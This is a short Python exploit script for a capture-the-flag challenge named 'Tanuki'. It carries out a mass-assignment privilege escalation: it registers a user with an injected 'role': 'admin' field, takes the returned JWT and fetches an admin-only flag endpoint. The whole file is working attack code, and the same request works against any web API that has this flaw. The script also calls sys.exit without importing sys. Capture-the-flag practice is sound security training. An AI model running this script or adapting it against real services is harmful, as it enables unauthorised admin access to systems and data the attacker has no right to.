import requests
import re
import argparse
import string
import random

parser = argparse.ArgumentParser(
    prog='Mass Assignment...',
    description='Python exploit script for Tanuki challenge',
    epilog='Thank you!!!'
)

parser.add_argument('--url', help="Target base url (e.g. https://target.com)", required=True)
args = parser.parse_args()

base_url = args.url.rstrip("/")
register_url = f"{base_url}/api/register"
login_url = f"{base_url}/api/login"
flag_url = f"{base_url}/api/admin/flag"
# Create session (stores cookies automatically)
session = requests.Session()
def random_string(length=7):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

username = f"admin_{random_string()}"
password = "P@ssw0rd@123!"
email = f"{username}@mail.com"
admin = f"admin"

headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

print(f"[*] Trying to register user: {username}")
register_data = {
    "username": username,
    "email": email,
    "password": password,
    "full_name": username,
    "role": admin
}

r = session.post(register_url, json=register_data, headers=headers)

# If registration fails (user exists), try login
if r.status_code != 200:
    print("[*] Registration failed, attempting login...")
    login_data = {
        "username": username,
        "password": password
    }
    r = session.post(login_url, json=login_data, headers=headers)

    if r.status_code != 200:
        print("[-] Login failed")
        print(r.text)
        sys.exit()

else:
    print("[+] Registration successful")

# Extract JWT token
try:
    token = r.json().get("token")
except Exception:
    print("[-] Could not extract token")
    sys.exit()

if not token:
    print("[-] No token received")
    sys.exit()

print("[+] Access token obtained")

# Store Access token 
session.headers.update({
    "Authorization": f"Bearer {token}"
})

print("[+] Admin login successfully..  [Payload]:- role=admin ")
print("[*] Extracting flag...")


resp = session.get(flag_url)

print("=" * 180)
print(resp.text)
print("=" * 180)

flag_match = re.search(r'bug\{.*?\}', resp.text)
